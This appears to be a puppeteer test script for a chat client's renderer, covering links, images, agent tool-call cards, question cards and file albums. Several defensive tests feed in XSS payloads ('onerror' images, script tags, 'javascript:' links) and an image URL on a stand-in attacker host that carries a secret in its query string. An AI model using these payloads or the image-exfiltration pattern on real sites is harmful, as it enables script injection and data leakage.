import http from 'node:http';
import { createReadStream, statSync, rmSync, mkdtempSync } from 'node:fs';
import { join, extname, normalize, resolve } from 'node:path';
import { tmpdir } from 'node:os';
import puppeteer from 'puppeteer-core';

const BUILD = process.argv[2];
if (!BUILD) { console.log('usage: node scripts/comms-render-check.mjs <build dir>'); process.exit(2); }
const PORT = Number(process.env.RENDER_PORT) || 8092;
const ORIGIN = 'http://127.0.0.1:' + PORT;
const PROFILE = mkdtempSync(join(tmpdir(), 'comms-render-check-'));
const TYPES = { '.html': 'text/html; charset=utf-8', '.js': 'text/javascript', '.mjs': 'text/javascript', '.json': 'application/json', '.txt': 'text/plain' };
const PAGE = '<!doctype html><html><head><meta charset="utf-8"><title>render check</title><script src="/assets/js/markdown.js"></script></head><body></body></html>';

function serve(dir, port) {
  const root = resolve(dir);
  const server = http.createServer((req, res) => {
    const path = decodeURIComponent(new URL(req.url, 'http://local').pathname);
    if (path === '/__render-check.html') {
      res.writeHead(200, { 'Content-Type': TYPES['.html'], 'Cache-Control': 'no-cache' });
      res.end(PAGE);
      return;
    }
    let file = normalize(join(root, path));
    if (!file.startsWith(root)) { res.writeHead(403); res.end(); return; }
    try {
      if (statSync(file).isDirectory()) file = join(file, 'index.html');
      statSync(file);
    } catch (_) {
      res.writeHead(404);
      res.end('not found');
      return;
    }
    res.writeHead(200, { 'Content-Type': TYPES[extname(file)] || 'application/octet-stream', 'Cache-Control': 'no-cache' });
    createReadStream(file).pipe(res);
  });
  return new Promise((ok) => server.listen(port, '127.0.0.1', () => ok(server)));
}

const PAGE_TESTS = async () => {
  const tests = [];
  const test = (name, fn) => tests.push([name, fn]);
  const fail = (msg) => { throw new Error(msg); };
  const ok = (v, m) => { if (!v) fail(m || 'expected a true value'); };
  const no = (v, m) => { if (v) fail(m || 'expected a false value'); };
  const eq = (a, b) => { if (a !== b) fail('expected ' + JSON.stringify(b) + ', got ' + JSON.stringify(a)); };
  const deepEq = (a, b) => eq(JSON.stringify(a), JSON.stringify(b));
  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
  await window.renderMarkdownReady;
  const C = await import('/assets/js/comms/cards.js');
  const T = { load_image: 'Load image from {host}' };
  let el = null;

  test('a bare link opens in a new tab', () => { C.renderBody(el, 'https://example.com', { from: 'person', T }); const a = el.querySelector('a'); eq(a.href, 'https://example.com/'); eq(a.target, '_blank'); ok(a.rel.includes('noopener') && a.rel.includes('noreferrer')); });
  test('script links lose their link', () => { C.renderBody(el, '[x](javascript:alert(1))', { from: 'person', T }); eq(el.querySelector('a'), null); ok(el.textContent.includes('x')); });
  test('outside images from people wait for a tap', () => { C.renderBody(el, '![p](https://t.example/p.gif)', { from: 'person', T }); eq(el.querySelector('img'), null); const b = el.querySelector('button.comms__imgload'); ok(b.textContent.includes('t.example')); b.click(); eq(el.querySelector('img').getAttribute('src'), 'https://t.example/p.gif'); });
  test('images from AI render', () => { C.renderBody(el, '![p](https://t.example/p.gif)', { from: 'model', T }); ok(el.querySelector('img')); });
  test('html never runs', () => { C.renderBody(el, '<img src=x onerror=alert(1)><script>window.__x=1</script>', { from: 'person', T }); eq(el.querySelector('[onerror]'), null); eq(el.querySelector('script'), null); eq(window.__x, undefined); });
  test('code is not linked', () => { C.renderBody(el, '`https://x.y`', { from: 'person', T }); eq(el.querySelector('code a'), null); });
  test('www links open over https', () => { C.renderBody(el, 'see www.example.com today', { from: 'person', T }); eq(el.querySelector('a').getAttribute('href'), 'https://www.example.com'); });

  const TA = { thought: 'Thought', matches: '{n} matches', lines: 'lines {a}–{b}', exit: 'exit {n}', show_all: 'Show all', show_changes: 'Show changes', show_image: 'Show image', notice_compacted: 'Context compacted', notice_unknown: 'Something this page can\'t show yet', status_running: 'running', status_error: 'failed', kind_search: 'Search', kind_read: 'Read', kind_edit: 'Edit', kind_run: 'Run', kind_web: 'Web', kind_subagent: 'Subagent', kind_other: 'Tool' };
  const agentTurn = () => [
    { type: 'tool_call', id: 'g', title: 'TODO', kind: 'search', status: 'done', input: 'TODO .' },
    { type: 'tool_call', id: 'r', title: 'notes.md', kind: 'read', status: 'done', input: '/a/notes.md' },
    { type: 'tool_call', id: 'e', title: 'app.js', kind: 'edit', status: 'done', input: '/x/app.js' },
    { type: 'diff', path: 'app.js', added: 4, removed: 2, ref: '1:0' },
    { type: 'tool_call', id: 'b', title: 'List files', kind: 'run', status: 'done', input: 'ls' },
    { type: 'tool_result', callId: 'g', text: 'a\nb\nc', bytes: 5, matches: 3 },
    { type: 'tool_result', callId: 'r', text: 'x', bytes: 1, lines: [10, 12] },
    { type: 'tool_result', callId: 'b', text: 'ok', bytes: 2, exit: 0 }
  ];
  test('agent: tool cards summarise search, read, edit and run', () => {
    const parts = agentTurn();
    C.renderAgentParts(el, parts, { T: TA, results: C.resultsOf(parts) });
    const cards = [...el.querySelectorAll('.comms__tool')].map((c) => c.textContent);
    ok(cards.some((t) => t.includes('Search') && t.includes('3 matches')), cards.join(' | '));
    ok(cards.some((t) => t.includes('Read') && t.includes('lines 10–12')));
    ok(cards.some((t) => t.includes('Run') && t.includes('exit 0')));
    ok(el.textContent.includes('+4') && el.textContent.includes('−2'));
    eq(el.querySelectorAll('.comms__tool-result--alone').length, 0);
  });
  test('agent: thinking folds into a chip', () => { C.renderAgentParts(el, [{ type: 'thought', ref: '1:0', chars: 120 }], { T: TA }); const b = el.querySelector('button.comms__thought'); ok(b && b.textContent.includes('Thought')); });
  test('agent: unknown agent parts show the plain notice', () => { C.renderAgentParts(el, [{ type: 'hologram' }, { type: 'notice', code: 'compacted' }], { T: TA }); ok(el.textContent.includes("Something this page can't show yet")); ok(el.textContent.includes('Context compacted')); });
  test('agent: no message HTML is ever inserted as HTML', () => { C.renderAgentParts(el, [{ type: 'text', text: '<img src=x onerror=alert(1)>' }, { type: 'tool_call', id: 'h', title: '<b onclick=alert(1)>x</b>', kind: 'run', status: 'done', input: '<script>window.__agentx=1</script>' }, { type: 'tool_result', callId: 'h', text: '<img src=y onerror=alert(2)>', bytes: 30 }], { T: TA, results: C.resultsOf([{ type: 'tool_result', callId: 'h', text: '<img src=y onerror=alert(2)>', bytes: 30 }]) }); eq(el.querySelector('[onerror]'), null); eq(el.querySelector('[onclick]'), null); eq(el.querySelector('script'), null); eq(window.__agentx, undefined); });
  test('agent: a PR chip links out safely', () => { C.renderAgentParts(el, [{ type: 'status', kind: 'pr', n: 1545, url: 'https://github.com/o/r/pull/1545' }, { type: 'status', kind: 'pr', n: 9, url: 'javascript:alert(1)' }], { T: TA }); const links = el.querySelectorAll('a'); eq(links.length, 1); eq(links[0].getAttribute('href'), 'https://github.com/o/r/pull/1545'); ok(el.textContent.includes('PR #9')); });

  test('fix C2: outside images in agent text wait for a tap', () => { C.renderAgentParts(el, [{ type: 'text', text: 'see ![x](https://evil.example/p.gif?d=secret)' }], { T: TA, TB: T }); eq(el.querySelector('img'), null); ok(el.querySelector('button.comms__imgload')); });
  test('fix I7: a fetched result stays open after a repaint', () => {
    const parts = [{ type: 'tool_call', id: 'k', title: 'cat', kind: 'run', status: 'done', input: 'cat f' }, { type: 'tool_result', callId: 'k', text: 'HEAD', bytes: 5000, ref: '9:0' }, { type: 'thought', ref: '8:0', chars: 5 }];
    const cache = new Map([['9:0', { text: 'HEAD...FULLTAIL' }], ['8:0', { text: 'OPENTHOUGHT' }]]);
    C.renderAgentParts(el, parts, { T: TA, results: C.resultsOf(parts), cache, opened: new Set(['8:0']) });
    ok(el.textContent.includes('FULLTAIL'));
    ok(!el.textContent.includes('Show all'));
    ok(el.textContent.includes('OPENTHOUGHT'));
  });
  test('fix C1 and I8: the open view keeps the session watched and the header honest', async () => {
    const AV2 = await import('/assets/js/comms/agent-view.js');
    const mkEl = (tag) => document.createElement(tag || 'div');
    const els = { log: mkEl(), chatTitle: mkEl('span'), chatAvatar: mkEl('span'), status: mkEl('span'), leave: mkEl('button'), peers: mkEl(), enc: mkEl(), callStart: mkEl('button'), share: mkEl('button'), msg: mkEl('input'), go: mkEl('button') };
    let online = true;
    const calls = [];
    const client = { on: () => () => {}, sessions: () => [{ sid: 's', online }], turns: () => [], turn: () => null, hello: (sid) => calls.push('hello:' + sid), watch: (sid) => calls.push('watch:' + sid), list() {}, open() {}, get() {}, channel: () => true, reset() {} };
    const v = AV2.createAgentView({ els, T: { agent: { running: 'running on your Mac', offline: 'Mac offline', message: 'Message the {name}' }, chat: {} }, client, keepAliveMs: 40, statusMs: 40 });
    v.open('s', null, 'S');
    eq(els.status.textContent, 'running on your Mac');
    online = false;
    await sleep(150);
    ok(calls.filter((c) => c === 'watch:s').length >= 2, calls.join(','));
    eq(els.status.textContent, 'Mac offline');
    v.close();
    const n = calls.length;
    await sleep(120);
    eq(calls.length, n);
  });

  test('fix I9 and M5: resume refetches, and the composer waits for a live channel', async () => {
    const AV3 = await import('/assets/js/comms/agent-view.js');
    const mkEl = (tag) => document.createElement(tag || 'div');
    const els = { log: mkEl(), chatTitle: mkEl('span'), chatAvatar: mkEl('span'), status: mkEl('span'), leave: mkEl('button'), peers: mkEl(), enc: mkEl(), callStart: mkEl('button'), share: mkEl('button'), msg: mkEl('input'), go: mkEl('button') };
    const handlers = {};
    let chan = false;
    const calls = [];
    const client = { on: (t, fn) => { handlers[t] = fn; return () => {}; }, sessions: () => [{ sid: 's', online: true }], turns: () => [], turn: () => null, hello: (sid) => calls.push('hello:' + sid), watch() {}, list() {}, open() {}, get() {}, channel: () => chan, reset: (sid, sub) => calls.push('reset:' + sid + ':' + (sub || '')) };
    const v = AV3.createAgentView({ els, T: { agent: { message: 'Message the {name}', mirror_only: 'Mirror only' }, chat: {} }, client });
    v.open('s', null, 'S');
    eq(els.msg.disabled, true);
    eq(els.msg.placeholder, 'Mirror only');
    chan = true;
    handlers.chan({ t: 'chan', sid: 's' });
    eq(els.msg.disabled, false);
    eq(els.msg.placeholder, 'Message the S');
    calls.length = 0;
    v.resume();
    deepEq(calls, ['reset:s:', 'hello:s']);
    v.close();
  });

  test('fix: a message refused by the bridge says why instead of staying sent', async () => {
    const AV4 = await import('/assets/js/comms/agent-view.js');
    const mkEl = (tag) => document.createElement(tag || 'div');
    const els = { log: mkEl(), chatTitle: mkEl('span'), chatAvatar: mkEl('span'), status: mkEl('span'), leave: mkEl('button'), peers: mkEl(), enc: mkEl(), callStart: mkEl('button'), share: mkEl('button'), msg: mkEl('input'), go: mkEl('button') };
    const handlers = {};
    const client = { on: (t, fn) => { handlers[t] = fn; return () => {}; }, sessions: () => [{ sid: 's', online: true }], turns: () => [], turn: () => null, hello() {}, watch() {}, list() {}, open() {}, get() {}, channel: () => true, reset() {}, say: async () => 'p:abc' };
    const v = AV4.createAgentView({ els, T: { agent: { sent: 'sent', delivered: 'delivered', unpaired: 'not delivered: pair this device', message: 'Message the {name}' }, chat: {} }, client });
    v.open('s', null, 'S');
    await v.say('hello');
    await sleep(100);
    ok(els.log.textContent.includes('sent'));
    handlers.err({ t: 'err', sid: 's', cmid: 'p:abc', code: 'unpaired' });
    await sleep(100);
    ok(els.log.textContent.includes('not delivered: pair this device'), els.log.textContent);
    v.close();
  });

  test('fix: a live update replaces only its turn and keeps the reading position', async () => {
    const AV5 = await import('/assets/js/comms/agent-view.js');
    const mkEl = (tag) => document.createElement(tag || 'div');
    const log = mkEl();
    log.style.cssText = 'height:120px;width:300px;overflow:auto';
    document.body.append(log);
    const els = { log, chatTitle: mkEl('span'), chatAvatar: mkEl('span'), status: mkEl('span'), leave: mkEl('button'), peers: mkEl(), enc: mkEl(), callStart: mkEl('button'), share: mkEl('button'), msg: mkEl('input'), go: mkEl('button') };
    const handlers = {};
    const para = (i) => ({ id: 'm' + i, role: 'assistant', ts: i, parts: [{ type: 'text', text: 'line ' + i + ' ' + 'word '.repeat(120) }] });
    const store = { 1: { n: 1, msgs: [para(0), para(1)] }, 2: { n: 2, msgs: [para(2), para(3)] }, 3: { n: 3, msgs: [para(4), para(5)] } };
    const client = { on: (t, fn) => { handlers[t] = fn; return () => {}; }, sessions: () => [{ sid: 's', online: true }], turns: () => [1, 2, 3], turn: (sid, n) => store[n] || null, hello() {}, watch() {}, list() {}, open() {}, get() {}, channel: () => true, reset() {} };
    const v = AV5.createAgentView({ els, T: { agent: { message: 'Message the {name}' }, chat: {} }, client });
    v.open('s', null, 'S');
    const first = log.querySelector('.comms__turn[data-n="1"]');
    ok(log.querySelector('.comms__agent-earlier'), 'earlier button');
    ok(log.scrollHeight > 600, 'tall enough ' + log.scrollHeight);
    log.scrollTop = 150;
    const removed = [];
    const mo = new MutationObserver((list) => { for (const r of list) for (const x of r.removedNodes) removed.push(x.dataset ? x.dataset.n : '?'); });
    mo.observe(log, { childList: true });
    store[3] = { n: 3, msgs: [para(4), para(5), para(6)] };
    handlers.turn({ t: 'turn', sid: 's', n: 3 });
    await sleep(150);
    mo.disconnect();
    deepEq(removed, ['3']);
    eq(log.querySelector('.comms__turn[data-n="1"]'), first);
    eq(log.scrollTop, 150);
    ok(log.textContent.includes('line 6'));
    v.close();
    log.remove();
  });

  test('fix: replacing a tall live turn keeps the reading position with lazy rendering', async () => {
    const AV6 = await import('/assets/js/comms/agent-view.js');
    const style = document.createElement('style');
    style.textContent = '.comms__turn{content-visibility:auto;contain-intrinsic-size:auto 480px}';
    document.head.append(style);
    const mkEl = (tag) => document.createElement(tag || 'div');
    const log = mkEl();
    log.style.cssText = 'height:300px;width:300px;overflow:auto';
    document.body.append(log);
    const els = { log, chatTitle: mkEl('span'), chatAvatar: mkEl('span'), status: mkEl('span'), leave: mkEl('button'), peers: mkEl(), enc: mkEl(), callStart: mkEl('button'), share: mkEl('button'), msg: mkEl('input'), go: mkEl('button') };
    const handlers = {};
    const para = (i) => ({ id: 'q' + i, role: 'assistant', ts: i, parts: [{ type: 'text', text: 'para ' + i + ' ' + 'word '.repeat(120) }] });
    let msgs = Array.from({ length: 30 }, (_, i) => para(i));
    const client = { on: (t, fn) => { handlers[t] = fn; return () => {}; }, sessions: () => [{ sid: 's', online: true }], turns: () => [0], turn: () => ({ n: 0, msgs }), hello() {}, watch() {}, list() {}, open() {}, get() {}, channel: () => true, reset() {} };
    const v = AV6.createAgentView({ els, T: { agent: { message: 'Message the {name}' }, chat: {} }, client });
    v.open('s', null, 'S');
    await sleep(50);
    ok(log.scrollHeight > 3000, 'tall ' + log.scrollHeight);
    const mid = Math.floor((log.scrollHeight - log.clientHeight) / 2);
    log.scrollTop = mid;
    await sleep(50);
    const before = log.scrollTop;
    msgs = msgs.concat([para(30)]);
    handlers.turn({ t: 'turn', sid: 's', n: 0 });
    await sleep(200);
    ok(Math.abs(log.scrollTop - before) < 5, 'top ' + log.scrollTop + ' vs ' + before);
    v.close();
    log.remove();
    style.remove();
  });

  test('fix: tool calls fold into symbols with counts; a tap lists them; a tap on one fetches its input and result', async () => {
    const AV7 = await import('/assets/js/comms/agent-view.js');
    const mkEl = (tag) => document.createElement(tag || 'div');
    const els = { log: mkEl(), chatTitle: mkEl('span'), chatAvatar: mkEl('span'), status: mkEl('span'), leave: mkEl('button'), peers: mkEl(), enc: mkEl(), callStart: mkEl('button'), share: mkEl('button'), msg: mkEl('input'), go: mkEl('button') };
    const handlers = {};
    const fetched = [];
    const msgs = [
      { id: 'u', role: 'user', ts: 1, parts: [{ type: 'text', text: 'go' }] },
      { id: 'a1', role: 'assistant', ts: 2, parts: [{ type: 'text', text: 'Looking.' }] },
      { id: 'a2', role: 'assistant', ts: 3, parts: [{ type: 'tool_call', id: 'c1', title: 'List files', kind: 'run', status: 'done', tool: 'Bash', ref: '10:0' }] },
      { id: 'r2', role: 'assistant', ts: 4, parts: [{ type: 'tool_result', callId: 'c1', bytes: 4, exit: 0, ref: '11:0' }] },
      { id: 'a3', role: 'assistant', ts: 5, parts: [{ type: 'tool_call', id: 'c2', title: 'notes.md', kind: 'read', status: 'done', tool: 'Read', ref: '12:0' }] },
      { id: 'r3', role: 'assistant', ts: 6, parts: [{ type: 'tool_result', callId: 'c2', bytes: 9, lines: [1, 3], ref: '13:0' }] },
      { id: 'a4', role: 'assistant', ts: 7, parts: [{ type: 'tool_call', id: 'c3', title: 'app.js', kind: 'edit', status: 'done', tool: 'Edit', ref: '14:0' }, { type: 'diff', path: 'app.js', added: 4, removed: 1, ref: '14:0' }] },
      { id: 'a5', role: 'assistant', ts: 8, parts: [{ type: 'tool_call', id: 'c4', title: 'Build', kind: 'run', status: 'running', tool: 'Bash', ref: '15:0' }] },
      { id: 'a6', role: 'assistant', ts: 9, parts: [{ type: 'text', text: 'Done.' }] }
    ];
    const texts = { '10:0': 'ls -la', '11:0': 'a\nb', '12:0': '/x/notes.md', '13:0': 'one\ntwo' };
    const client = { on: (t, fn) => { handlers[t] = fn; return () => {}; }, sessions: () => [{ sid: 's', online: true }], turns: () => [0], turn: () => ({ n: 0, msgs }), hello() {}, watch() {}, list() {}, open() {}, channel: () => true, reset() {}, get: (sid, ref) => { fetched.push(ref); setTimeout(() => handlers.part({ t: 'part', sid, ref, text: texts[ref] || '' }), 5); } };
    const v = AV7.createAgentView({ els, T: { agent: { kind_run: 'Run', kind_read: 'Read', kind_edit: 'Edit', status_running: 'running', message: 'Message the {name}' }, chat: {} }, client });
    v.open('s', null, 'S');
    const log = els.log;
    const groups = log.querySelectorAll('.comms__toolgroup');
    eq(groups.length, 1);
    const k = (kind) => (groups[0].querySelector('.comms__toolgroup-k[data-kind="' + kind + '"]') || {}).textContent || '';
    ok(k('run').includes('2') && k('read').includes('1') && k('edit').includes('1'), k('run') + '|' + k('read') + '|' + k('edit'));
    ok(groups[0].querySelector('.comms__toolgroup-sum').textContent.includes('+4'));
    ok(groups[0].querySelector('.comms__toolgroup-sum--running'));
    eq(log.querySelectorAll('.comms__tool').length, 0);
    ok(!log.textContent.includes('List files'));
    ok(log.textContent.includes('Looking.') && log.textContent.includes('Done.'));
    groups[0].querySelector('.comms__toolgroup-sum').click();
    eq(log.querySelectorAll('.comms__tool').length, 4);
    ok(log.textContent.includes('List files'));
    eq(fetched.length, 0);
    log.querySelector('.comms__tool .comms__tool-head').click();
    await sleep(60);
    deepEq(fetched.slice().sort(), ['10:0', '11:0']);
    ok(log.textContent.includes('ls -la') && log.textContent.includes('a\nb'), log.textContent.slice(0, 200));
    v.paint();
    eq(log.querySelectorAll('.comms__tool').length, 4);
    ok(log.textContent.includes('ls -la'));
    v.close();
  });

  test('fix: an ask shows as a question card; a tap and Send answer it; asked clears it', async () => {
    const AV8 = await import('/assets/js/comms/agent-view.js');
    const mkEl = (tag) => document.createElement(tag || 'div');
    const els = { log: mkEl(), chatTitle: mkEl('span'), chatAvatar: mkEl('span'), status: mkEl('span'), leave: mkEl('button'), peers: mkEl(), enc: mkEl(), callStart: mkEl('button'), share: mkEl('button'), msg: mkEl('input'), go: mkEl('button') };
    const handlers = {};
    const answers = [];
    const client = { on: (t, fn) => { handlers[t] = fn; return () => {}; }, sessions: () => [{ sid: 's', online: true }], turns: () => [], turn: () => null, hello() {}, watch() {}, list() {}, open() {}, get() {}, channel: () => true, reset() {}, answer: async (sid, id, a) => { answers.push({ sid, id, a }); return 'p:ans'; } };
    const v = AV8.createAgentView({ els, T: { agent: { ask_send: 'Send answer', ask_other: 'Or type an answer', ask_sent: 'Answer sent', message: 'Message the {name}' }, chat: {} }, client });
    v.open('s', null, 'S');
    handlers.ask({ t: 'ask', sid: 's', id: 'abcdefghijkl', questions: [{ question: 'Name the next file?', header: 'File', options: [{ label: 'red.txt', description: 'Red' }, { label: 'blue.txt' }], multiSelect: false }, { question: 'Which parts?', header: 'Parts', options: [{ label: 'a' }, { label: 'b' }, { label: 'c' }], multiSelect: true }] });
    handlers.ask({ t: 'ask', sid: 'other', id: 'zzzzzzzzzzzz', questions: [{ question: 'Not mine', options: [{ label: 'x' }, { label: 'y' }] }] });
    await sleep(100);
    const card = els.log.querySelector('.comms__agent-ask');
    ok(card, 'card');
    ok(card.textContent.includes('Name the next file?') && card.textContent.includes('Which parts?'));
    ok(!els.log.textContent.includes('Not mine'));
    const opt = (label) => [...card.querySelectorAll('.comms__ask-opt')].find((b) => b.textContent.includes(label));
    const send = card.querySelector('.comms__ask-send');
    eq(send.disabled, true);
    opt('red.txt').click();
    opt('blue.txt').click();
    eq(opt('red.txt').getAttribute('aria-pressed'), 'false');
    eq(opt('blue.txt').getAttribute('aria-pressed'), 'true');
    eq(send.disabled, true);
    opt('a').click();
    opt('c').click();
    eq(send.disabled, false);
    v.paint();
    eq(els.log.querySelector('.comms__agent-ask'), card);
    send.click();
    await sleep(50);
    deepEq(answers, [{ sid: 's', id: 'abcdefghijkl', a: [{ labels: ['blue.txt'] }, { labels: ['a', 'c'] }] }]);
    ok(card.textContent.includes('Answer sent'));
    handlers.asked({ t: 'asked', sid: 's', id: 'abcdefghijkl' });
    await sleep(100);
    eq(els.log.querySelector('.comms__agent-ask'), null);
    v.close();
  });

  test('fix: thoughts fold into the activity row and a task notice is one small line', async () => {
    const AV9 = await import('/assets/js/comms/agent-view.js');
    const mkEl = (tag) => document.createElement(tag || 'div');
    const els = { log: mkEl(), chatTitle: mkEl('span'), chatAvatar: mkEl('span'), status: mkEl('span'), leave: mkEl('button'), peers: mkEl(), enc: mkEl(), callStart: mkEl('button'), share: mkEl('button'), msg: mkEl('input'), go: mkEl('button') };
    const handlers = {};
    const msgs = [
      { id: 'u', role: 'user', ts: 1, parts: [{ type: 'text', text: 'ask me' }] },
      { id: 'a1', role: 'assistant', ts: 2, parts: [{ type: 'thought', ref: '5:0', chars: 40 }] },
      { id: 'a2', role: 'assistant', ts: 3, parts: [{ type: 'tool_call', id: 'q1', title: 'Red or blue?', kind: 'ask', status: 'done', ref: '6:0' }] },
      { id: 'a3', role: 'assistant', ts: 4, parts: [{ type: 'notice', code: 'task', status: 'completed', answers: ['blue.txt'] }] },
      { id: 'a4', role: 'assistant', ts: 5, parts: [{ type: 'thought', ref: '8:0', chars: 10 }] },
      { id: 'a5', role: 'assistant', ts: 6, parts: [{ type: 'text', text: 'Made blue.txt' }] }
    ];
    const client = { on: (t, fn) => { handlers[t] = fn; return () => {}; }, sessions: () => [{ sid: 's', online: true }], turns: () => [0], turn: () => ({ n: 0, msgs }), hello() {}, watch() {}, list() {}, open() {}, channel: () => true, reset() {}, get: (sid, ref) => { setTimeout(() => handlers.part({ t: 'part', sid, ref, text: 'THINKING ' + ref }), 5); } };
    const v = AV9.createAgentView({ els, T: { agent: { thought: 'Thought', kind_ask: 'Question', ask_answered: 'Answered: {a}', message: 'Message the {name}' }, chat: {} }, client });
    v.open('s', null, 'S');
    const log = els.log;
    eq(log.querySelectorAll('button.comms__thought').length, 0);
    const rows = log.querySelectorAll('.comms__toolgroup');
    eq(rows.length, 2);
    ok(rows[0].querySelector('.comms__toolgroup-k[data-kind="thought"]') && rows[0].querySelector('.comms__toolgroup-k[data-kind="ask"]'));
    ok(rows[1].querySelector('.comms__toolgroup-k[data-kind="thought"]'));
    const note = log.querySelector('.comms__agent-task');
    ok(note && note.textContent.includes('Answered: blue.txt'), note ? note.textContent : 'none');
    eq(log.querySelectorAll('.comms__line--me').length, 1);
    rows[0].querySelector('.comms__toolgroup-sum').click();
    const th = rows[0].querySelector('button.comms__thought');
    ok(th, 'thought entry');
    th.click();
    await sleep(50);
    ok(rows[0].textContent.includes('THINKING 5:0'));
    v.close();
  });
  test('fix: the signed note shows until this device has a delivered message', async () => {
    const AV10 = await import('/assets/js/comms/agent-view.js');
    try { localStorage.removeItem('mentria.comms.agent_signed_seen'); } catch (_) {}
    const mkEl = (tag) => document.createElement(tag || 'div');
    const note = mkEl('p');
    note.id = 'comms-agent-signed';
    document.body.append(note);
    const els = { log: mkEl(), chatTitle: mkEl('span'), chatAvatar: mkEl('span'), status: mkEl('span'), leave: mkEl('button'), peers: mkEl(), enc: mkEl(), callStart: mkEl('button'), share: mkEl('button'), msg: mkEl('input'), go: mkEl('button') };
    const handlers = {};
    const client = { on: (t, fn) => { handlers[t] = fn; return () => {}; }, sessions: () => [{ sid: 's', online: true }], turns: () => [], turn: () => null, hello() {}, watch() {}, list() {}, open() {}, get() {}, channel: () => true, reset() {}, say: async () => 'p:one' };
    const v = AV10.createAgentView({ els, T: { agent: { sent: 'sent', delivered: 'delivered', message: 'Message the {name}' }, chat: {} }, client });
    v.open('s', null, 'S');
    eq(note.hidden, false);
    await v.say('hi');
    handlers.ack({ t: 'ack', sid: 's', cmid: 'p:one' });
    await sleep(100);
    eq(note.hidden, true);
    v.close();
    v.open('s', null, 'S');
    eq(note.hidden, true);
    v.close();
    note.remove();
  });

  const R = (i) => btoa(String.fromCharCode(...new Uint8Array(16).fill(i))).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
  const MH = btoa(String.fromCharCode(...new Uint8Array(32).fill(2))).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
  const REF0 = R(10);
  const album = (n) => ({ type: 'album', aid: 'a1', n, items: Array.from({ length: n }, (_, i) => ({ type: 'image', ref: R(10 + i), mh: MH, size: 1000, mime: 'image/jpeg', w: 320, h: 240, thumb: 'QUJD' })) });
  const pdf = () => ({ type: 'file', ref: R(50), mh: MH, size: 120000, mime: 'application/pdf', name: 'doc.pdf' });
  const TT = { load_image: T.load_image, files: { status_send: 'sending {i} of {n} · {rate} · {path}', status_recv: 'receiving {i} of {n} · {rate} · {path}', direct: 'direct', via_relay: 'via relay', saved_here: 'saved on this device', open_pdf: 'Open in PDF tool', save: 'Save', retry: 'Retry', paused: 'Paused at {size}. It carries on by itself when Comms is open on both.', no_space: 'Not enough space on this device', import: 'import' } };
  const opts = (over = {}) => ({ t: over.t || '', me: false, T: TT, media: () => ({ state: over.state || 'offered', have: 0, total: 1 }), onAccept() {}, onRetry() {}, onOpen() {}, onOpenPdf() {} });
  test('album: layouts', () => { eq([1, 2, 3, 4, 7].map((n) => C.albumLayout(n)).join(), 'one,two,three,grid,grid'); });
  test('album: +N on the fourth tile', () => { C.renderParts(el, [album(7)], opts()); eq(el.querySelectorAll('.comms__album img').length, 4); eq(el.querySelector('.comms__album-more').textContent, '+3'); });
  test('album: blurred until done', () => { C.renderParts(el, [album(2)], opts({ state: 'moving' })); eq(el.querySelectorAll('img.is-blurred').length, 2); C.updateParts(el, REF0, { state: 'done', have: 1, total: 1 }); ok(el.querySelector('img[src="/comms-media/' + REF0 + '"]')); });
  test('no accept bar before the file is known here', () => { C.renderParts(el, [pdf()], { ...opts(), media: () => ({ state: 'unknown' }) }); ok(el.querySelector('.comms__acceptbar').hidden); });
  test('my own album is sharp at once, with no ring', () => { C.renderParts(el, [album(2)], { ...opts(), me: true, media: () => ({ state: 'queued', local: true, have: 1, total: 1 }) }); eq(el.querySelectorAll('img.is-blurred').length, 0); eq(el.querySelectorAll('img[src^="/comms-media/"]').length, 2); ok([...el.querySelectorAll('svg')].every((r) => r.hidden)); });
  test('the progress ring keeps its own look inside the Comms page styles', async () => { const html = await (await fetch('/comms/')).text(); const css = [...html.matchAll(/<style>([\s\S]*?)<\/style>/g)].map((m) => m[1]).join('\n'); const st = document.createElement('style'); st.textContent = css; document.head.append(st); try { const wrap = document.createElement('div'); wrap.className = 'comms__app comms__app--people'; el.append(wrap); C.renderParts(wrap, [album(2)], opts({ state: 'moving' })); C.updateParts(wrap, R(10), { state: 'moving', have: 1, total: 4 }); const ring = wrap.querySelector('.comms__tile svg'); const cs = getComputedStyle(ring); eq(cs.display === 'none', false); eq(cs.borderTopWidth, '0px'); eq(Math.round(ring.getBoundingClientRect().width), 36); } finally { st.remove(); } });
  test('fix I8: a space pause offers Retry', () => { C.renderParts(el, [pdf()], { ...opts(), media: () => ({ state: 'paused', note: 'space', have: 1, total: 4 }) }); ok(!el.querySelector('.comms__parts-retry').hidden); });
  test('fix M2: my own freed file offers Download again', () => { C.renderParts(el, [pdf()], { ...opts(), me: true, media: () => ({ state: 'removed' }) }); ok(!el.querySelector('.comms__acceptbar').hidden); });
  test('fix M12: an album only grows from the same sender', () => { C.renderParts(el, [album(2)], { ...opts(), sender: 'fpA' }); const more = { type: 'album', aid: 'a1', n: 4, items: [3, 4].map((i) => ({ type: 'image', ref: R(30 + i), mh: MH, size: 10, mime: 'image/jpeg', thumb: 'QUJD' })) }; eq(C.addToAlbum(el, more, 'fpB'), false); eq(el.querySelectorAll('.comms__tile').length, 2); eq(C.addToAlbum(el, more, 'fpA'), true); eq(el.querySelectorAll('.comms__tile').length, 4); });
  test('file card: pdf gets open and save', () => { C.renderParts(el, [pdf()], opts({ state: 'done' })); ok(el.querySelector('[data-act="save"]')); ok(el.querySelector('[data-act="open-pdf"]')); });
  test('file card: save hands the file over instead of linking to it', async () => { const calls = []; C.renderParts(el, [pdf()], { ...opts({ state: 'done' }), onSave: (ref, it) => { calls.push([ref, it && it.name]); return null; } }); no(el.querySelector('a[download]'), 'a download link is still there'); el.querySelector('[data-act="save"]').click(); await sleep(20); deepEq(calls, [[R(50), 'doc.pdf']]); });
  test('file card: a big file saves on a second tap', async () => { const f = new File(['x'], 'doc.pdf'); const shared = []; const real = navigator.share; navigator.share = async (d) => { shared.push(d.files[0]); }; try { C.renderParts(el, [pdf()], { ...opts({ state: 'done' }), T: { ...TT, files: { ...TT.files, save_now: 'Save now' } }, onSave: () => ({ later: true, file: f }) }); const b = el.querySelector('[data-act="save"]'); b.click(); await sleep(20); eq(b.textContent, 'Save now'); b.click(); await sleep(20); eq(shared[0], f); eq(b.textContent, 'Save'); } finally { navigator.share = real; } });
  test('unknown part falls back to t', () => { C.renderParts(el, [{ type: 'unknown' }], opts({ t: 'Sent a hologram' })); eq(el.textContent.trim(), 'Sent a hologram'); });
